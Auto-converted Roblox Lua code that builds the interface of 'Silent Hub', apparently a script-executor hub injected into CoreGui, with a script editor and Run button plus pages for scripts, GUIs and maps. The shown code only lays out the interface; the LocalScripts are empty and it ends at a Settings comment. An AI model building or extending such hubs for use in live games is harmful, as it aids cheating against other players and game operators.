--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 205 | Scripts: 23 | Modules: 0 | Tags: 7
local CollectionService = game:GetService("CollectionService");
local G2L = {};

-- StarterGui.SilentHub
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 1337;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ClipToDeviceSafeArea"] = false;
G2L["1"]["Name"] = [[SilentHub]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.SilentHub.UI
G2L["2"] = Instance.new("Folder", G2L["1"]);
G2L["2"]["Name"] = [[UI]];


-- StarterGui.SilentHub.UI.MainContainer
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["Active"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["3"]["ClipsDescendants"] = true;
G2L["3"]["Size"] = UDim2.new(0, 603, 0, 311);
G2L["3"]["Position"] = UDim2.new(0.23019, 0, 0.25308, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[MainContainer]];


-- StarterGui.SilentHub.UI.MainContainer.UIDrag
G2L["4"] = Instance.new("LocalScript", G2L["3"]);
-- G2L["4"]["Capabilities"] = ;
G2L["4"]["Sandboxed"] = true;
G2L["4"]["Name"] = [[UIDrag]];


-- StarterGui.SilentHub.UI.MainContainer.PageContainer
G2L["5"] = Instance.new("Frame", G2L["3"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["ClipsDescendants"] = true;
G2L["5"]["Size"] = UDim2.new(0, 603, 0, 275);
G2L["5"]["Position"] = UDim2.new(0, 0, 0.12016, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Name"] = [[PageContainer]];
G2L["5"]["BackgroundTransparency"] = 0.5;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home
G2L["6"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["6"]["Active"] = true;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["6"]["ScrollingEnabled"] = false;
G2L["6"]["Name"] = [[Home]];
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["6"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["ScrollBarThickness"] = 5;
G2L["6"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["6"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.Welcome
G2L["7"] = Instance.new("TextLabel", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["RichText"] = true;
G2L["7"]["Size"] = UDim2.new(0, 486, 0, 142);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[<font size="30" weight="heavy">Welcome to Silent Hub!</font><br/><br/>To get started click the tabs to find what scripts your looking for.<br/>The scrolling bar is invisible so to scroll use your scroll wheel.<br/><br/>Want scripts or more features added?<br/><br/>Join our Discord for support, donations, and more!]];
G2L["7"]["Name"] = [[Welcome]];


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer
G2L["8"] = Instance.new("Frame", G2L["6"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["Size"] = UDim2.new(0, 486, 0, 115);
G2L["8"]["Position"] = UDim2.new(0, 0, 0.55253, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[ButtonContainer]];
G2L["8"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.UIListLayout
G2L["9"] = Instance.new("UIListLayout", G2L["8"]);
G2L["9"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["9"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord
G2L["a"] = Instance.new("TextButton", G2L["8"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["BackgroundTransparency"] = 0.95;
G2L["a"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Server:]];
G2L["a"]["Name"] = [[Discord]];
G2L["a"]["Position"] = UDim2.new(0.03498, 0, 0.66981, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD
G2L["c"] = Instance.new("TextLabel", G2L["8"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextSize"] = 14;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundTransparency"] = 0.95;
G2L["c"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[MOTD:]];
G2L["c"]["Name"] = [[MOTD]];
G2L["c"]["Position"] = UDim2.new(0.03498, 0, 0.08043, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor
G2L["e"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["e"]["Visible"] = false;
G2L["e"]["Active"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["e"]["ScrollingEnabled"] = false;
G2L["e"]["Name"] = [[Script Editor]];
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["e"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["ScrollBarThickness"] = 5;
G2L["e"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["e"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer
G2L["f"] = Instance.new("Frame", G2L["e"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["Size"] = UDim2.new(0, 469, 0, 214);
G2L["f"]["Position"] = UDim2.new(0.01646, 0, 0.01946, 0);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Name"] = [[EditorContainer]];
G2L["f"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer.TextBoxContainer
G2L["10"] = Instance.new("ScrollingFrame", G2L["f"]);
G2L["10"]["Active"] = true;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["10"]["Name"] = [[TextBoxContainer]];
G2L["10"]["ScrollBarImageTransparency"] = 0.95;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["10"]["Size"] = UDim2.new(0, 469, 0, 213);
G2L["10"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["ScrollBarThickness"] = 0;
G2L["10"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer.TextBoxContainer.TextBox
G2L["11"] = Instance.new("TextBox", G2L["10"]);
G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 12;
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["11"]["MultiLine"] = true;
G2L["11"]["ClearTextOnFocus"] = false;
G2L["11"]["Size"] = UDim2.new(0, 469, 0, 15);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[print("Hello World!")]];
G2L["11"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer
G2L["12"] = Instance.new("Frame", G2L["e"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Size"] = UDim2.new(0, 469, 0, 23);
G2L["12"]["Position"] = UDim2.new(0.01646, 0, 0.87938, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Name"] = [[ButtonContainer]];
G2L["12"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.UIListLayout
G2L["13"] = Instance.new("UIListLayout", G2L["12"]);
G2L["13"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["13"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["13"]["Padding"] = UDim.new(0.01, 0);
G2L["13"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["13"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["13"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run
G2L["14"] = Instance.new("TextButton", G2L["12"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["BackgroundTransparency"] = 0.95;
G2L["14"]["Size"] = UDim2.new(0, 230, 0, 23);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Run]];
G2L["14"]["Name"] = [[Run]];
G2L["14"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run.LocalScript
G2L["15"] = Instance.new("LocalScript", G2L["14"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear
G2L["16"] = Instance.new("TextButton", G2L["12"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["BackgroundTransparency"] = 0.95;
G2L["16"]["Size"] = UDim2.new(0, 230, 0, 23);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Clear]];
G2L["16"]["Name"] = [[Clear]];
G2L["16"]["Position"] = UDim2.new(0.49104, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear.LocalScript
G2L["17"] = Instance.new("LocalScript", G2L["16"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6
G2L["18"] = Instance.new("TextButton", G2L["12"]);
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["BackgroundTransparency"] = 0.95;
G2L["18"]["Size"] = UDim2.new(0, 96, 0, 23);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[R6]];
G2L["18"]["Name"] = [[R6]];
G2L["18"]["Position"] = UDim2.new(0.52995, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6.LocalScript
G2L["19"] = Instance.new("LocalScript", G2L["18"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15
G2L["1a"] = Instance.new("TextButton", G2L["12"]);
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["TextSize"] = 14;
G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["BackgroundTransparency"] = 0.95;
G2L["1a"]["Size"] = UDim2.new(0, 96, 0, 23);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Text"] = [[R15]];
G2L["1a"]["Name"] = [[R15]];
G2L["1a"]["Position"] = UDim2.new(0.73568, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15.LocalScript
G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn
G2L["1c"] = Instance.new("TextButton", G2L["12"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 14;
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["BackgroundTransparency"] = 0.95;
G2L["1c"]["Size"] = UDim2.new(0, 96, 0, 23);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Respawn]];
G2L["1c"]["Name"] = [[Respawn]];
G2L["1c"]["Position"] = UDim2.new(0.9414, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn.LocalScript
G2L["1d"] = Instance.new("LocalScript", G2L["1c"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts
G2L["1e"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["1e"]["Visible"] = false;
G2L["1e"]["Active"] = true;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["1e"]["ScrollingEnabled"] = false;
G2L["1e"]["Name"] = [[Scripts]];
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["1e"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["ScrollBarThickness"] = 5;
G2L["1e"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["1e"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox
G2L["1f"] = Instance.new("TextBox", G2L["1e"]);
G2L["1f"]["Name"] = [[SearchBox]];
G2L["1f"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["PlaceholderText"] = [[Search Scripts]];
G2L["1f"]["Size"] = UDim2.new(0, 470, 0, 24);
G2L["1f"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[]];
G2L["1f"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer
G2L["21"] = Instance.new("ScrollingFrame", G2L["1e"]);
G2L["21"]["Active"] = true;
G2L["21"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["21"]["Name"] = [[ButtonContainer]];
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["21"]["Size"] = UDim2.new(0, 470, 0, 214);
G2L["21"]["Position"] = UDim2.new(0.01646, 0, 0.14008, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["ScrollBarThickness"] = 0;
G2L["21"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.Button
G2L["23"] = Instance.new("TextButton", G2L["21"]);
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["BackgroundTransparency"] = 0.95;
G2L["23"]["Size"] = UDim2.new(0, 452, 0, 24);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Name"] = [[Button]];
G2L["23"]["Position"] = UDim2.new(0.0383, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.UIListLayout
G2L["24"] = Instance.new("UIListLayout", G2L["21"]);
G2L["24"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["24"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["24"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs
G2L["25"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["25"]["Visible"] = false;
G2L["25"]["Active"] = true;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["25"]["ScrollingEnabled"] = false;
G2L["25"]["Name"] = [[GUIs]];
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["25"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["ScrollBarThickness"] = 5;
G2L["25"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["25"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox
G2L["26"] = Instance.new("TextBox", G2L["25"]);
G2L["26"]["Name"] = [[SearchBox]];
G2L["26"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["TextWrapped"] = true;
G2L["26"]["TextSize"] = 14;
G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["PlaceholderText"] = [[Search GUIs]];
G2L["26"]["Size"] = UDim2.new(0, 470, 0, 24);
G2L["26"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[]];
G2L["26"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox.LocalScript
G2L["27"] = Instance.new("LocalScript", G2L["26"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer
G2L["28"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["28"]["Active"] = true;
G2L["28"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["28"]["Name"] = [[ButtonContainer]];
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["28"]["Size"] = UDim2.new(0, 470, 0, 214);
G2L["28"]["Position"] = UDim2.new(0.01646, 0, 0.14008, 0);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["ScrollBarThickness"] = 0;
G2L["28"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.LocalScript
G2L["29"] = Instance.new("LocalScript", G2L["28"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.Button
G2L["2a"] = Instance.new("TextButton", G2L["28"]);
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 14;
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["BackgroundTransparency"] = 0.95;
G2L["2a"]["Size"] = UDim2.new(0, 452, 0, 24);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Name"] = [[Button]];
G2L["2a"]["Position"] = UDim2.new(0.0383, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.UIListLayout
G2L["2b"] = Instance.new("UIListLayout", G2L["28"]);
G2L["2b"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["2b"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["2b"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps
G2L["2c"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["2c"]["Visible"] = false;
G2L["2c"]["Active"] = true;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["2c"]["ScrollingEnabled"] = false;
G2L["2c"]["Name"] = [[Maps]];
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["2c"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["ScrollBarThickness"] = 5;
G2L["2c"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["2c"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox
G2L["2d"] = Instance.new("TextBox", G2L["2c"]);
G2L["2d"]["Name"] = [[SearchBox]];
G2L["2d"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["TextWrapped"] = true;
G2L["2d"]["TextSize"] = 14;
G2L["2d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d"]["PlaceholderText"] = [[Search Maps]];
G2L["2d"]["Size"] = UDim2.new(0, 470, 0, 24);
G2L["2d"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Text"] = [[]];
G2L["2d"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer
G2L["2f"] = Instance.new("ScrollingFrame", G2L["2c"]);
G2L["2f"]["Active"] = true;
G2L["2f"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["2f"]["Name"] = [[ButtonContainer]];
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["2f"]["Size"] = UDim2.new(0, 470, 0, 214);
G2L["2f"]["Position"] = UDim2.new(0.01646, 0, 0.14008, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["ScrollBarThickness"] = 0;
G2L["2f"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.LocalScript
G2L["30"] = Instance.new("LocalScript", G2L["2f"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.Button
G2L["31"] = Instance.new("TextButton", G2L["2f"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 14;
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["BackgroundTransparency"] = 0.95;
G2L["31"]["Size"] = UDim2.new(0, 452, 0, 24);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Name"] = [[Button]];
G2L["31"]["Position"] = UDim2.new(0.0383, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.UIListLayout
G2L["32"] = Instance.new("UIListLayout", G2L["2f"]);
G2L["32"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["32"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["32"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings
